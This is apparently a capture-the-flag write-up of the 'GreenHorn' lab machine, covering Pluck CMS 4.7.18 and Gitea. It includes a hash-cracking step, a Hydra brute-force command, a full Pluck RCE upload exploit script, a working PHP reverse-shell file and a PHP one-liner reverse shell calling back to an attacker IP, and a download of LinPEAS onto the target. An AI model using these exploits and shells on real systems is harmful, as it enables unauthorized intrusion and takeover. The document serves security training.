---
layout: post
title: "GreenHorn"
date: 2025-09-11 00:00:00 -0400
author: Hugo Beaulieu
categories: linux machine
tags: linux pluck-cms gitea hash-cracking rce password-reuse depixelization pdf-analysis
---

## Overview

GreenHorn is a Linux machine running Pluck CMS 4.7.18 and Gitea. The exploitation path involves discovering a password hash in a public Gitea repository, cracking it to gain admin access to Pluck CMS, exploiting a file upload vulnerability to achieve RCE, pivoting through password reuse, and ultimately extracting a pixelated password from a PDF using depixelization techniques.

## Initial Enumeration

### Nmap Scan

We begin with an nmap scan to identify open ports and services:

```bash
nmap -sV -v 10.100.100.100
```

Results:

```bash
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
3000/tcp open  ppp?
```

Three ports are open: SSH on port 22, HTTP on port 80, and an unknown service on port 3000.

### Web Application Discovery

Accessing the website on port 80, we discover it's running **Pluck CMS**:

```bash
admin | powered by pluck
```

Accessing port 3000, we find a **Gitea** instance:

```bash
Powered by Gitea Version: 1.21.11
```

### Directory Enumeration

We scan directories for both Pluck and Gitea, but find nothing particularly interesting:

```bash
dirb http://greenhorn.htb/
dirb http://10.100.100.100:3000/
```

## Pluck CMS Analysis

### Version Discovery

Accessing the Pluck login page reveals it's running version **4.7.18**:

```bash
http://greenhorn.htb/login.php
```

The login form has only a password field, no username field.

### Login Request Analysis

Using Burp Suite, we intercept a login request with a test password:

```bash
POST /login.php HTTP/1.1
Host: greenhorn.htb
Content-Length: 31
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://greenhorn.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://greenhorn.htb/login.php
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=8pr8gvim4vq20s4mvbgaaknhet
Connection: close

cont1=test&bogus=&submit=Log+in
```

The password field is named `cont1`, and there's a `bogus` field, likely for brute-force prevention.

### Attempted Brute Force

We try to crack the login with Hydra and rockyou.txt:

```bash
hydra -v -V -d -l username -P /home/kali/rockyou.txt -t 16 -m "/login.php:cont1=^PASS^&bogus=&submit=Log+in:F=incorrect" http-post-form://greenhorn.htb
```

However, we quickly encounter brute-force protection:

```bash
You have exceeded the number of login attempts. Please wait 5 minutes before logging in again.
```

## Gitea Repository Discovery

Having exhausted leads for Pluck, we turn our attention to Gitea. After exploring, we find a repository that appears to host the Pluck source code:

```bash
http://10.100.100.100:3000/GreenAdmin/GreenHorn
```

We can create an account, add an SSH key, and clone the repository. Unfortunately, we can't upload files with `git push`.

### Finding Credentials

Exploring the repository further, we discover two interesting files:

**token.php:**

```php
http://10.100.100.100:3000/GreenAdmin/GreenHorn/src/branch/main/data/settings/token.php
<?php $token = '[REDACTED-TOKEN]'; ?>
```

**pass.php:**

```php
http://10.100.100.100:3000/GreenAdmin/GreenHorn/src/branch/main/data/settings/pass.php
<?php
$ww = '[REDACTED-SHA512-HASH]';
?>
```

### Hash Cracking

We quickly realize `pass.php` contains a SHA-512 hash. We attempt to decode it with hashcat and rockyou.txt:

```bash
echo "[REDACTED-SHA512-HASH]" > hash.txt
hashcat -m 1700 -a 0 hash.txt /home/kali/rockyou.txt
```

Once decoded, we obtain the password `[REDACTED]`:

```bash
Dictionary cache hit:
* Filename..: /home/kali/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

[REDACTED-SHA512-HASH]:[REDACTED]
```

## Gaining Admin Access to Pluck

With this password, we can access Pluck's admin panel:

```bash
http://greenhorn.htb/admin.php?action=start
```

Admin access confirmed! After exploring, we discover it's possible to upload files from the admin panel - the perfect way to get a reverse shell!

### File Upload Restrictions

From the admin panel, we try to upload a `reverse-shell.php` file, but the server automatically appends `.txt` to it. Different extensions yield the same result (`.php5`, `.php7`, `.phtml`, `.phar`, etc.). We need to find an alternative upload method.

## CVE Exploitation - RCE via ZIP Upload

Searching on exploit-db.com, we find an RCE exploit:
[Pluck v4.7.18 - Remote Code Execution](https://www.exploit-db.com/exploits/51592)

```python
#Exploit Title: Pluck v4.7.18 - Remote Code Execution (RCE)
#Application: pluck
#Version: 4.7.18
#Bugs:  RCE
#Technology: PHP
#Vendor URL: https://github.com/pluck-cms/pluck
#Software Link: https://github.com/pluck-cms/pluck
#Date of found: 10-07-2023
#Author: Mirabbas Ağalarov
#Tested on: Linux


import requests
from requests_toolbelt.multipart.encoder import MultipartEncoder

login_url = "http://greenhorn.htb/login.php"
upload_url = "http://greenhorn.htb/admin.php?action=installmodule"
headers = {"Referer": login_url,}
login_payload = {"cont1": "[REDACTED]","bogus": "","submit": "Log in"}

file_path = "/home/kali/reverse-shell.zip"

multipart_data = MultipartEncoder(
    fields={
        "sendfile": ("reverse-shell.zip", open(file_path, "rb"), "application/zip"),
        "submit": "Upload"
    }
)

session = requests.Session()
login_response = session.post(login_url, headers=headers, data=login_payload)


if login_response.status_code == 200:
    print("Login account")


    upload_headers = {
        "Referer": upload_url,
        "Content-Type": multipart_data.content_type
    }
    upload_response = session.post(upload_url, headers=upload_headers, data=multipart_data)


    if upload_response.status_code == 200:
        print("ZIP file download.")
    else:
        print("ZIP file download error. Response code:", upload_response.status_code)
else:
    print("Login problem. response code:", login_response.status_code)


rce_url="http://localhost/pluck/data/modules/reverse-shell/reverse-shell.php"

rce=requests.get(rce_url)

print(rce.text)
```

### Creating the Reverse Shell

We create `reverse-shell.zip` containing `reverse-shell.php`:

```php
<?php
$ip = '10.10.10.10'; // change this to your IP address
$port = 4444; // change this to your listening port
$socket = fsockopen($ip, $port);
if ($socket) {
    $shell = 'uname -a; w; id; /bin/sh -i';
    fwrite($socket, $shell);
    while (!feof($socket)) {
        $command = fgets($socket);
        $output = '';
        if ($command) {
            $output = shell_exec($command);
            fwrite($socket, $output);
        }
    }
    fclose($socket);
}
?>
```

### Getting a Shell

We start netcat to listen for incoming connections:

```bash
nc -lvnp 4444
```

Then execute the upload script:

```bash
python upload-reverse-shell.py
```

A connection is established with netcat:

```bash
listening on [any] 4444 ...
connect to [10.10.10.10] from (UNKNOWN) [10.100.100.100] 51092
uname -a; w; id; /bin/sh -i
```

## Shell Upgrade

Once on the server, we perform some reconnaissance:

```bash
whoami
www-data
pwd
/var/www/html/pluck
ls
README.md
SECURITY.md
admin.php
data
docs
files
images
index.php
install.php
login.php
requirements.php
robots.txt
```

We quickly realize the shell is quite limited - `cd` doesn't work. We check our shell in `/etc/passwd`:

```bash
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
...
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
...
git:x:114:120:Git Version Control,,,:/home/git:/bin/bash
mysql:x:115:121:MySQL Server,,,:/nonexistent:/bin/false
junior:x:1000:1000::/home/junior:/bin/bash
_laurel:x:997:997::/var/log/laurel:/bin/false
```

Our shell is `/usr/sbin/nologin`, which means we're too limited in our actions. We need to change our shell.

### Escaping with PHP

Since Pluck is a PHP-based CMS, we create a second reverse shell with PHP to escape the first:

```php
php -r '$sock=fsockopen("10.10.10.10",5555);exec("/bin/bash -i <&3 >&3 2>&3");'
```

We start netcat on our machine:

```bash
nc -lvnp 5555
```

The connection is established:

```bash
listening on [any] 5555 ...
connect to [10.10.10.10] from (UNKNOWN) [10.100.100.100] 41880
bash: cannot set terminal process group (1114): Inappropriate ioctl for device
bash: no job control in this shell
www-data@greenhorn:~/html/pluck$
```

## Privilege Escalation to Junior

### System Exploration

Once connected with the new shell, we navigate the server:

```bash
www-data@greenhorn:~/html/pluck$ cd /
cd /
www-data@greenhorn:/$ ls -la
ls -la
total 76
drwxr-xr-x  20 root root  4096 Jun 20 07:06 .
drwxr-xr-x  20 root root  4096 Jun 20 07:06 ..
lrwxrwxrwx   1 root root     7 Feb 16 18:37 bin -> usr/bin
drwxr-xr-x   4 root root  4096 Jul 15 05:51 boot
dr-xr-xr-x   2 root root  4096 Jun 20 06:36 cdrom
drwxr-xr-x   2 root root  4096 Jun 20 06:36 data
drwxr-xr-x  20 root root  4020 Jul 25 02:41 dev
drwxr-xr-x 107 root root  4096 Jul 15 05:42 etc
drwxr-xr-x   4 root root  4096 Jun 20 06:36 home
lrwxrwxrwx   1 root root     7 Feb 16 18:37 lib -> usr/lib
lrwxrwxrwx   1 root root     9 Feb 16 18:37 lib32 -> usr/lib32
lrwxrwxrwx   1 root root     9 Feb 16 18:37 lib64 -> usr/lib64
lrwxrwxrwx   1 root root    10 Feb 16 18:37 libx32 -> usr/libx32
drwx------   2 root root 16384 Apr 10 23:33 lost+found
drwxr-xr-x   2 root root  4096 Jun 20 06:36 media
drwxr-xr-x   2 root root  4096 Jun 20 06:36 mnt
drwxr-xr-x   2 root root  4096 Jun 20 06:36 opt
dr-xr-xr-x 292 root root     0 Jul 25 02:41 proc
drwx------   5 root root  4096 Jul 25 02:48 root
drwxr-xr-x  28 root root   820 Jul 25 03:03 run
lrwxrwxrwx   1 root root     8 Feb 16 18:37 sbin -> usr/sbin
drwxr-xr-x   2 root root  4096 Jun 20 06:36 srv
dr-xr-xr-x  13 root root     0 Jul 25 02:41 sys
drwxrwxrwt  12 root root  4096 Jul 25 02:55 tmp
drwxr-xr-x  14 root root  4096 Jun 20 06:36 usr
drwxr-xr-x  13 root root  4096 Jun 20 06:36 var
```

In `/home` we find the `junior` directory containing a `user.txt` file (likely the user flag):

```bash
www-data@greenhorn:/$ ls -la /home
ls -la /home
total 16
drwxr-xr-x  4 root   root   4096 Jun 20 06:36 .
drwxr-xr-x 20 root   root   4096 Jun 20 07:06 ..
drwxr-x---  2 git    git    4096 Jun 20 06:36 git
drwxr-xr-x  3 junior junior 4096 Jun 20 06:36 junior
www-data@greenhorn:/$ ls -la /home/junior
ls -la /home/junior
total 76
drwxr-xr-x 3 junior junior  4096 Jun 20 06:36 .
drwxr-xr-x 4 root   root    4096 Jun 20 06:36 ..
lrwxrwxrwx 1 junior junior     9 Jun 11 14:38 .bash_history -> /dev/null
drwx------ 2 junior junior  4096 Jun 20 06:36 .cache
-rw-r----- 1 root   junior 61367 Jun 11 14:39 Using OpenVAS.pdf
-rw-r----- 1 root   junior    33 Jul 25 02:48 user.txt
```

We need to become the user `junior` to view the flag.

### LinPEAS Enumeration

We use [LinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS) to find privilege escalation vulnerabilities. We download the script on our machine and serve it:

```bash
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
sudo python3 -m http.server 80
```

From the target server, we download LinPEAS:

```bash
cd /tmp
wget 10.10.10.10/linpeas.sh
chmod +x linpeas.sh
```

Then execute it:

```bash
./linpeas.sh
....
╔══════════╣ Analyzing .service files
/etc/systemd/system/gitea.service is calling this writable executable: /usr/local/bin/gitea
/etc/systemd/system/multi-user.target.wants/gitea.service is calling this writable executable: /usr/local/bin/gitea

╔══════════╣ Binary processes permissions (non 'root root' and not belonging to current user)
132M -rwxrwxrwx 1 junior junior 132M Apr 16 03:44 /usr/local/bin/gitea

╔══════════╣ Cleaned processes
git         1090  0.1  4.2 2063276 168748 ?      Ssl  05:43   0:01 /usr/local/bin/gitea web --config /etc/gitea/app.ini
```

Examining the permissions, it appears junior installed Gitea but misconfigured the permissions. We can write to `/usr/local/bin/gitea`, which is called by `/etc/systemd/system/gitea.service`.

### Password Reuse

Since junior configured Gitea and uploaded the `pass.php` file we cracked earlier, we try the same password, `[REDACTED]`:

```bash
www-data@greenhorn:/$ su junior
su junior
Password: [REDACTED]
whoami
junior
ls -la
total 76
drwxr-xr-x  20 root root  4096 Jun 20 07:06 .
drwxr-xr-x  20 root root  4096 Jun 20 07:06 ..
lrwxrwxrwx   1 root root     7 Feb 16 18:37 bin -> usr/bin
drwxr-xr-x   4 root root  4096 Jul 15 05:51 boot
dr-xr-xr-x   2 root root  4096 Jun 20 06:36 cdrom
drwxr-xr-x   2 root root  4096 Jun 20 06:36 data
drwxr-xr-x  20 root root  4020 Jul 25 02:41 dev
drwxr-xr-x 107 root root  4096 Jul 15 05:42 etc
drwxr-xr-x   4 root   root   4096 Jun 20 06:36 home
lrwxrwxrwx   1 root root     7 Feb 16 18:37 lib -> usr/lib
lrwxrwxrwx   1 root root     9 Feb 16 18:37 lib32 -> usr/lib32
lrwxrwxrwx   1 root root     9 Feb 16 18:37 lib64 -> usr/lib64
lrwxrwxrwx   1 root root    10 Feb 16 18:37 libx32 -> usr/libx32
drwx------   2 root root 16384 Apr 10 23:33 lost+found
drwxr-xr-x   2 root root  4096 Jun 20 06:36 media
drwxr-xr-x   2 root root  4096 Jun 20 06:36 mnt
drwxr-xr-x   2 root root  4096 Jun 20 06:36 opt
dr-xr-xr-x 294 root root     0 Jul 25 02:41 proc
drwx------   5 root root  4096 Jul 25 02:48 root
drwxr-xr-x  28 root root   820 Jul 25 03:32 run
lrwxrwxrwx   1 root root     8 Feb 16 18:37 sbin -> usr/sbin
drwxr-xr-x   2 root root  4096 Jun 20 06:36 srv
dr-xr-xr-x  13 root root     0 Jul 25 02:41 sys
drwxrwxrwt  12 root root  4096 Jul 25 03:09 tmp
drwxr-xr-x  14 root root  4096 Jun 20 06:36 usr
drwxr-xr-x  13 root root  4096 Jun 20 06:36 var
```

Success!

### User Flag

Once logged in as `junior`, we retrieve the user flag:

```bash
cd /home/junior
ls
user.txt
Using OpenVAS.pdf
cat user.txt
[REDACTED]
```

## Privilege Escalation to Root

### Investigating Gitea Services

Once the user flag is validated, we turn our attention to the two Gitea services:

```bash
cat /etc/systemd/system/gitea.service | grep User=
User=git

cat /etc/systemd/system/multi-user.target.wants/gitea.service | grep User=
User=git
```

Both services run as the `git` user. We should modify `/usr/local/bin/gitea` which is called by these services.

However, a quick test reveals we can't modify the file:

```bash
echo test > /usr/local/bin/gitea
bash: line 19: /usr/local/bin/gitea: Text file busy
```

At this point, Gitea appears to be a dead end. We return to junior's home directory.

### PDF Analysis

Having not yet explored the `Using OpenVAS.pdf` file, we download it to examine it:

```bash
nc -lvp 1234 > "/home/junior/Using OpenVAS.pdf"
nc 10.10.10.10 1234 < "/home/kali/Using OpenVAS.pdf"
```

The PDF contains a command and a password, but it's pixelated:

```bash
Hello junior,
We have recently installed OpenVAS on our server to actively monitor and identify potential security
vulnerabilities. Currently, only the root user, represented by myself, has the authorization to execute
OpenVAS using the following command:
`sudo /usr/sbin/openvas`
Enter password:
As part of your familiarization with this tool, we encourage you to learn how to use OpenVAS
effectively. In the future, you will also have the capability to run OpenVAS by entering the same
command and providing your password when prompted.
Feel free to reach out if you have any questions or need further assistance.
Have a great week,
Mr. Green
```

### Depixelization

We extract the image from the PDF using pdfimages:

```bash
pdfimages -all 'Using OpenVAS.pdf' password
```

We attempt to depixelate the image using `depix`:

```bash
python3 depix.py \
-p ./password.png \
-s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png \
-o ./password-output.png
```

### Root Flag

We try the depixelated password to connect as root and display the flag:

```bash
su
Password: [REDACTED]
whoami
root
cd /root
ls
cleanup.sh
restart.sh
root.txt
cat root.txt
[REDACTED]
```

Success! We've obtained root access.

## Key Takeaways

- **Public repositories** can expose sensitive configuration files and credentials
- **SHA-512 hashes** can be cracked with tools like hashcat when weak passwords are used
- **Pluck CMS 4.7.18** allows authenticated file upload via ZIP modules for RCE
- **Shell limitations** (like /usr/sbin/nologin) can be bypassed by spawning new shells
- **Password reuse** across different services is a common security weakness
- **Pixelated passwords** in PDFs can be recovered using depixelization tools like depix
- **PDF metadata and embedded images** should be scrubbed before sharing sensitive documents
- **File permissions** on service binaries should be carefully configured
- **Gitea repositories** can leak application source code and credentials
